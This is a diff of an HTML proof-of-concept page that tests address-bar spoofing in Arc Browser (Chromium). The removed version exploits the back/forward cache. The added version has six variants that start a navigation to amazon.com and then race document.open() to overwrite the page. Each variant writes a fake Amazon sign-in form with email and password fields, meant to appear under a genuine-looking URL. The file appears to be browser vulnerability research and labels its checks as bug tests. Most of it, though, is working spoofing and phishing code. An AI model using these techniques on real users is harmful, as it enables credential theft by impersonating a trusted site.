@@ -1,207 +1,280 @@
 <!DOCTYPE html>
 <html>
 <head>
-<title>PoC 2: BFCache URL/Content Desync</title>
+<title>PoC 5: document.open + Navigation Cancel</title>
 <!--
-  PoC 2: BFCache (Back/Forward Cache) Exploitation
+  PoC 5: document.open() + Navigation Cancellation URL Persistence
 
   Target: Arc Browser (Chromium 146+)
 
-  Technique: Exploit the Back/Forward Cache to create a state where:
-  - The URL bar shows the previous page's URL (the legitimate site)
-  - The visible content is controlled by the attacker
+  Technique: Based on Chromium issue 40096164. If a page calls
+  location.reload() followed by document.open(), the pending navigation
+  is cancelled but the pending URL may persist in the address bar.
 
-  Based on CVE-2023-4764 pattern but with new variants that test
-  current Chromium's BFCache implementation edge cases.
+  The original fix clears the NavigationEntry in the NavigationRequest
+  destructor. This PoC tests variants that might cancel navigations
+  through different code paths that don't trigger the same cleanup.
 
-  Attack flow:
-  1. Victim visits legitimate site (amazon.com) - this gets cached
-  2. Victim navigates to attacker page (this page)
-  3. Attacker page goes back via history.back()
-  4. BFCache may restore the attacker's content while URL shows amazon.com
-
-  Key variant: Use history manipulation + BFCache interaction to desync
-  the navigation entry's URL from the restored page content.
+  Variants:
+  A) location.reload() + document.open() (classic, likely patched)
+  B) form.submit() + document.open() (different navigation initiator)
+  C) meta refresh + document.open() (client redirect path)
+  D) anchor click + document.open() (simulated user navigation)
+  E) history.go(0) + document.open() (same-doc reload path)
 -->
 </head>
 <body style="font-family: -apple-system, BlinkMacSystemFont, sans-serif; padding: 40px; background: #f5f5f5;">
-<h2>PoC 2: BFCache URL/Content Desynchronization</h2>
-<p>This page must be navigated to FROM a legitimate site (e.g., amazon.com).</p>
-<p>It will attempt to go back while maintaining attacker content.</p>
+<h2>PoC 5: document.open + Navigation Cancel</h2>
+<p>Tests whether cancelling a pending navigation via document.open() leaves the pending URL visible.</p>
 
 <button onclick="testVariantA()" style="padding: 12px 24px; font-size: 16px; cursor: pointer; margin: 8px;">
-  Variant A: Simple history.back() with delay
+  A: reload() + document.open()
 </button>
-<br>
 <button onclick="testVariantB()" style="padding: 12px 24px; font-size: 16px; cursor: pointer; margin: 8px;">
-  Variant B: pushState chain + back()
+  B: form.submit() + document.open()
 </button>
-<br>
 <button onclick="testVariantC()" style="padding: 12px 24px; font-size: 16px; cursor: pointer; margin: 8px;">
-  Variant C: Fragment + replaceState + back()
+  C: meta refresh + document.open()
 </button>
-<br>
-<button onclick="setupPhase1()" style="padding: 12px 24px; font-size: 16px; cursor: pointer; margin: 8px; background: #ff9900; border: none; color: #000;">
-  Setup: Go to Amazon first (required)
+<button onclick="testVariantD()" style="padding: 12px 24px; font-size: 16px; cursor: pointer; margin: 8px;">
+  D: anchor click + document.open()
+</button>
+<button onclick="testVariantE()" style="padding: 12px 24px; font-size: 16px; cursor: pointer; margin: 8px;">
+  E: history.go(0) + document.open()
+</button>
+<button onclick="testVariantF()" style="padding: 12px 24px; font-size: 16px; cursor: pointer; margin: 8px;">
+  F: window.open + document.open race
 </button>
 
 <div id="log" style="margin-top: 20px; padding: 16px; background: #1a1a1a; color: #0f0; font-family: monospace; font-size: 13px; border-radius: 8px; max-height: 400px; overflow-y: auto;"></div>
 
+<!-- Hidden form for Variant B -->
+<form id="hiddenForm" action="https://www.amazon.com/" method="GET" style="display:none;">
+  <input type="hidden" name="ref" value="test">
+</form>
+
+<!-- Hidden anchor for Variant D -->
+<a id="hiddenLink" href="https://www.amazon.com/" style="display:none;">Amazon</a>
+
 <script>
 function log(msg) {
   const el = document.getElementById('log');
-  el.innerHTML += msg + '<br>';
-  el.scrollTop = el.scrollHeight;
+  if (el) el.innerHTML += msg + '<br>';
 }
 
-// Phase 1: Navigate to Amazon to build up the history
-function setupPhase1() {
-  log('Navigating to amazon.com...');
-  log('After it loads, navigate back to this page.');
-  log('Then run Variant A, B, or C.');
-  window.location.href = 'https://www.amazon.com/';
-}
-
-// Variant A: CVE-2023-4764 classic pattern
-// Replace page content with phishing UI, then history.back()
+// Variant A: Classic location.reload() + document.open()
+// Chromium issue 40096164 pattern
 function testVariantA() {
-  log('[A] Replacing page content with phishing UI...');
+  log('[A] Starting reload + document.open variant...');
 
-  // Replace the entire page with fake Amazon content
-  document.body.innerHTML = `
-    <div style="font-family:Arial,sans-serif;max-width:800px;margin:0 auto;">
-      <div style="background:#131921;padding:10px 20px;color:#fff;display:flex;align-items:center;">
-        <h2 style="color:#ff9900;margin:0;">amazon</h2>
-        <div style="flex:1;margin:0 20px;">
-          <input type="text" placeholder="Search Amazon" style="width:100%;padding:8px;border-radius:4px;border:none;">
-        </div>
-      </div>
-      <div style="background:#fff;padding:30px;margin-top:2px;">
-        <h2>Sign-In</h2>
-        <p style="color:#666;">Your session has expired. Please sign in to continue.</p>
-        <label style="font-weight:bold;font-size:13px;">Email or mobile phone number</label>
-        <input type="email" style="width:100%;padding:10px;margin:8px 0 16px;border:1px solid #a6a6a6;border-radius:4px;box-sizing:border-box;">
-        <label style="font-weight:bold;font-size:13px;">Password</label>
-        <input type="password" style="width:100%;padding:10px;margin:8px 0 16px;border:1px solid #a6a6a6;border-radius:4px;box-sizing:border-box;">
-        <button style="width:100%;padding:10px;background:#f0c14b;border:1px solid #a88734;border-radius:4px;cursor:pointer;font-size:14px;">Sign In</button>
-        <p style="margin-top:16px;font-size:12px;color:#555;">By continuing, you agree to Amazon's Conditions of Use and Privacy Notice.</p>
-      </div>
-    </div>
-  `;
-  document.title = 'Amazon.com: Online Shopping';
+  // First, change the URL via pushState so we have something "interesting"
+  // to see if the pending URL persists
+  history.replaceState({}, '', '/account/login');
+  log('[A] URL changed to /account/login via replaceState');
 
-  log('[A] Content replaced. Going back in 500ms...');
-  log('[A] If BFCache restores this content with amazon.com URL = vulnerability');
+  // Initiate reload (creates a pending navigation)
+  location.reload();
 
-  // Go back after a delay
-  // The BFCache should restore the amazon.com page, but if our content
-  // persists due to a BFCache state mismatch, the URL will show amazon.com
-  // while our phishing content displays
-  setTimeout(() => {
-    window.history.back();
-  }, 500);
+  // Immediately call document.open to cancel the reload
+  // If the fix doesn't cover this path, the pending URL persists
+  document.open();
+  document.write(`
+    <html>
+    <head><title>Amazon - Sign In</title></head>
+    <body style="font-family:Arial;max-width:400px;margin:40px auto;padding:20px;">
+      <h2>Sign In</h2>
+      <p>Your session expired. Please sign in again.</p>
+      <input type="email" placeholder="Email" style="width:100%;padding:10px;margin:8px 0;border:1px solid #ccc;border-radius:4px;box-sizing:border-box;">
+      <input type="password" placeholder="Password" style="width:100%;padding:10px;margin:8px 0;border:1px solid #ccc;border-radius:4px;box-sizing:border-box;">
+      <button style="width:100%;padding:10px;background:#f0c14b;border:1px solid #a88734;border-radius:4px;cursor:pointer;">Sign In</button>
+      <p style="margin-top:12px;font-size:12px;color:#555;">
+        CHECK: What URL does the address bar show?<br>
+        If it shows the pending reload URL instead of about:blank = BUG
+      </p>
+    </body>
+    </html>
+  `);
+  document.close();
 }
 
-// Variant B: Manipulate history with pushState before going back
-// This creates multiple history entries that may confuse BFCache restoration
+// Variant B: Form submission creates a different type of navigation
 function testVariantB() {
-  log('[B] Creating history state chain...');
+  log('[B] Starting form.submit() + document.open variant...');
 
-  // Create a chain of history entries via pushState
-  // This may confuse the BFCache about which entry to restore
-  for (let i = 0; i < 5; i++) {
-    history.pushState({step: i}, '', '#step' + i);
+  const form = document.getElementById('hiddenForm');
+
+  // Submit the form (initiates navigation to amazon.com)
+  form.submit();
+
+  // Immediately cancel with document.open
+  // Form submissions go through a different navigation path
+  setTimeout(() => {
+    document.open();
+    document.write(`
+      <html>
+      <head><title>Amazon - Sign In</title></head>
+      <body style="font-family:Arial;max-width:400px;margin:40px auto;padding:20px;">
+        <h2>Account Verification Required</h2>
+        <p>Amazon requires additional verification for your account.</p>
+        <input type="email" placeholder="Email" style="width:100%;padding:10px;margin:8px 0;border:1px solid #ccc;border-radius:4px;box-sizing:border-box;">
+        <input type="password" placeholder="Password" style="width:100%;padding:10px;margin:8px 0;border:1px solid #ccc;border-radius:4px;box-sizing:border-box;">
+        <button style="width:100%;padding:10px;background:#f0c14b;border:1px solid #a88734;border-radius:4px;cursor:pointer;">Verify</button>
+        <p style="font-size:12px;color:#555;margin-top:12px;">
+          CHECK: Does address bar show amazon.com? If yes = BUG
+        </p>
+      </body>
+      </html>
+    `);
+    document.close();
+  }, 0);
+}
+
+// Variant C: Meta refresh creates a client redirect navigation
+function testVariantC() {
+  log('[C] Starting meta refresh + document.open variant...');
+
+  // Add a meta refresh that navigates to amazon
+  const meta = document.createElement('meta');
+  meta.httpEquiv = 'refresh';
+  meta.content = '0;url=https://www.amazon.com/';
+  document.head.appendChild(meta);
+
+  log('[C] Meta refresh added, navigation pending...');
+
+  // Cancel with document.open before the meta refresh completes
+  setTimeout(() => {
+    document.open();
+    document.write(`
+      <html>
+      <head><title>Amazon.com Shopping</title></head>
+      <body style="font-family:Arial;max-width:400px;margin:40px auto;padding:20px;">
+        <h2>Welcome Back</h2>
+        <p>Please sign in to continue shopping.</p>
+        <input type="email" placeholder="Email" style="width:100%;padding:10px;margin:8px 0;border:1px solid #ccc;border-radius:4px;box-sizing:border-box;">
+        <input type="password" placeholder="Password" style="width:100%;padding:10px;margin:8px 0;border:1px solid #ccc;border-radius:4px;box-sizing:border-box;">
+        <button style="width:100%;padding:10px;background:#f0c14b;border:1px solid #a88734;border-radius:4px;cursor:pointer;">Sign In</button>
+        <p style="font-size:12px;color:#555;margin-top:12px;">
+          CHECK: Does the address bar show amazon.com?
+        </p>
+      </body>
+      </html>
+    `);
+    document.close();
+  }, 0);
+}
+
+// Variant D: Programmatic anchor click
+function testVariantD() {
+  log('[D] Starting anchor click + document.open variant...');
+
+  // Click the hidden link (simulates navigation to amazon)
+  const link = document.getElementById('hiddenLink');
+
+  // Create a mouse event to simulate a real click
+  const event = new MouseEvent('click', {
+    bubbles: true,
+    cancelable: true,
+    view: window
+  });
+  link.dispatchEvent(event);
+
+  log('[D] Link clicked, navigation to amazon.com initiated...');
+
+  // Race to cancel with document.open
+  setTimeout(() => {
+    document.open();
+    document.write(`
+      <html>
+      <head><title>Amazon.com</title></head>
+      <body style="font-family:Arial;max-width:400px;margin:40px auto;padding:20px;">
+        <h2>Session Expired</h2>
+        <input type="email" placeholder="Email" style="width:100%;padding:10px;margin:8px 0;border:1px solid #ccc;border-radius:4px;box-sizing:border-box;">
+        <input type="password" placeholder="Password" style="width:100%;padding:10px;margin:8px 0;border:1px solid #ccc;border-radius:4px;box-sizing:border-box;">
+        <button style="width:100%;padding:10px;background:#f0c14b;border:1px solid #a88734;border-radius:4px;cursor:pointer;">Continue</button>
+      </body>
+      </html>
+    `);
+    document.close();
+  }, 0);
+}
+
+// Variant E: history.go(0) is a same-document reload
+function testVariantE() {
+  log('[E] Starting history.go(0) + document.open variant...');
+
+  // Change URL to something meaningful
+  history.replaceState({}, '', '/signin');
+
+  // Same-document reload
+  history.go(0);
+
+  // Cancel immediately
+  document.open();
+  document.write(`
+    <html>
+    <head><title>Sign In</title></head>
+    <body style="font-family:Arial;max-width:400px;margin:40px auto;padding:20px;">
+      <h2>Sign In Required</h2>
+      <input type="email" placeholder="Email" style="width:100%;padding:10px;margin:8px 0;border:1px solid #ccc;border-radius:4px;box-sizing:border-box;">
+      <input type="password" placeholder="Password" style="width:100%;padding:10px;margin:8px 0;border:1px solid #ccc;border-radius:4px;box-sizing:border-box;">
+      <button style="width:100%;padding:10px;background:#007bff;color:#fff;border:none;border-radius:4px;cursor:pointer;">Sign In</button>
+      <p style="font-size:12px;color:#555;margin-top:12px;">
+        CHECK: Is the URL bar showing /signin or the original page URL?
+      </p>
+    </body>
+    </html>
+  `);
+  document.close();
+}
+
+// Variant F: window.open to target, then race document.open on the popup
+function testVariantF() {
+  log('[F] Starting window.open + document.open race variant...');
+
+  // Open popup to amazon (renderer-initiated, new tab)
+  const popup = window.open('https://www.amazon.com/');
+
+  if (!popup) {
+    log('[F] Popup blocked. Allow popups for this site.');
+    return;
   }
 
-  log('[B] Pushed 5 history states');
+  log('[F] Popup opened to amazon.com');
 
-  // Replace content with phishing UI
-  document.body.innerHTML = `
-    <div style="font-family:Arial,sans-serif;max-width:600px;margin:40px auto;">
-      <div style="background:#232f3e;padding:15px 20px;color:#fff;border-radius:4px 4px 0 0;">
-        <h2 style="margin:0;color:#ff9900;">amazon</h2>
-      </div>
-      <div style="background:#fff;padding:24px;border:1px solid #ddd;border-top:none;border-radius:0 0 4px 4px;">
-        <h3>Verify your identity</h3>
-        <p>For your security, please re-enter your password.</p>
-        <input type="password" placeholder="Password"
-               style="width:100%;padding:10px;margin:8px 0;border:1px solid #a6a6a6;border-radius:4px;box-sizing:border-box;">
-        <button style="width:100%;padding:10px;background:#f0c14b;border:1px solid #a88734;
-                       border-radius:4px;cursor:pointer;">Continue</button>
-      </div>
-    </div>
-  `;
-  document.title = 'Amazon.com - Verify Identity';
+  // In a new, unmodified tab, renderer-initiated navigations DO show
+  // the pending URL. Race to inject content via document.open before
+  // Chromium detects the access.
+  const attempts = [0, 1, 2, 5, 10, 20, 50, 100, 150, 200, 300, 500];
 
-  log('[B] Content replaced. Navigating back through chain...');
-
-  // Go back through all the pushState entries, then one more to hit the
-  // previous page (amazon.com). The rapid traversal may confuse BFCache.
-  setTimeout(() => {
-    // Go back past all our pushState entries + 1 more
-    window.history.go(-(5 + 1));
-  }, 300);
-}
-
-// Variant C: Use replaceState to change URL, then fragment navigation
-// combined with back() to create URL/content mismatch
-function testVariantC() {
-  log('[C] Starting replaceState + fragment variant...');
-
-  // Replace current state URL with something that looks legitimate
-  // (same-origin restriction means we can only change the path)
-  history.replaceState({}, 'Amazon', '/amazon-login');
-  log('[C] replaceState changed path to /amazon-login');
-
-  // Add a fragment
-  history.pushState({}, '', '/amazon-login#signin');
-  log('[C] pushState added #signin fragment');
-
-  // Replace content
-  document.body.innerHTML = `
-    <div style="font-family:Arial,sans-serif;max-width:600px;margin:40px auto;background:#fff;padding:24px;border:1px solid #ddd;border-radius:8px;">
-      <img src="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 30'><text x='0' y='24' font-family='Arial' font-size='24' font-weight='bold' fill='%23FF9900'>amazon</text></svg>" width="120" style="margin-bottom:16px;">
-      <h3>Sign In</h3>
-      <input type="email" placeholder="Email" style="width:100%;padding:10px;margin:8px 0;border:1px solid #a6a6a6;border-radius:4px;box-sizing:border-box;">
-      <input type="password" placeholder="Password" style="width:100%;padding:10px;margin:8px 0;border:1px solid #a6a6a6;border-radius:4px;box-sizing:border-box;">
-      <button style="width:100%;padding:10px;background:#f0c14b;border:1px solid #a88734;border-radius:4px;cursor:pointer;">Sign In</button>
-    </div>
-  `;
-  document.title = 'Amazon.com Sign In';
-
-  log('[C] Content replaced. Going back in 200ms...');
-  log('[C] If URL shows amazon.com but our content remains = vulnerability');
-
-  // Navigate back - should go to amazon.com from history
-  setTimeout(() => {
-    window.history.back();
-
-    // After going back, quickly try to inject again via pageshow event
-    // BFCache pages fire 'pageshow' with persisted=true
-    window.addEventListener('pageshow', function(e) {
-      if (e.persisted) {
-        log('[C] BFCache pageshow detected! Injecting content...');
-        // If we get here during a BFCache restore, we might be able to
-        // modify the page while the URL shows the cached page's URL
-        try {
-          document.body.innerHTML = '<h1>BFCache content injection successful!</h1>';
-        } catch(ex) {
-          log('[C] Injection failed: ' + ex.message);
+  attempts.forEach(delay => {
+    setTimeout(() => {
+      try {
+        // document.open on the popup's initial empty document
+        popup.document.open();
+        popup.document.write(`
+          <html>
+          <head><title>Amazon.com</title></head>
+          <body style="font-family:Arial;padding:40px;">
+            <h1 style="color:#ff9900;">amazon</h1>
+            <h2>Sign In</h2>
+            <p>Injected at delay: ${delay}ms</p>
+            <input type="email" placeholder="Email" style="width:300px;padding:10px;display:block;margin:8px 0;border:1px solid #ccc;border-radius:4px;">
+            <input type="password" placeholder="Password" style="width:300px;padding:10px;display:block;margin:8px 0;border:1px solid #ccc;border-radius:4px;">
+            <button style="padding:10px 30px;background:#f0c14b;border:1px solid #a88734;border-radius:4px;cursor:pointer;">Sign In</button>
+          </body>
+          </html>
+        `);
+        popup.document.close();
+        log('[F] Content injected at ' + delay + 'ms! Check popup address bar.');
+      } catch(e) {
+        // Cross-origin or access denied
+        if (delay === attempts[attempts.length - 1]) {
+          log('[F] All injection attempts failed: ' + e.message);
         }
       }
-    });
-  }, 200);
+    }, delay);
+  });
 }
-
-// Auto-detect if we arrived via back navigation (potential BFCache)
-window.addEventListener('pageshow', function(e) {
-  if (e.persisted) {
-    log('PAGE RESTORED FROM BFCACHE - persisted=true');
-    log('Current URL: ' + window.location.href);
-    log('Document title: ' + document.title);
-    log('If URL does not match this page origin = URL BAR SPOOFED');
-  }
-});
 </script>
 </body>
 </html>
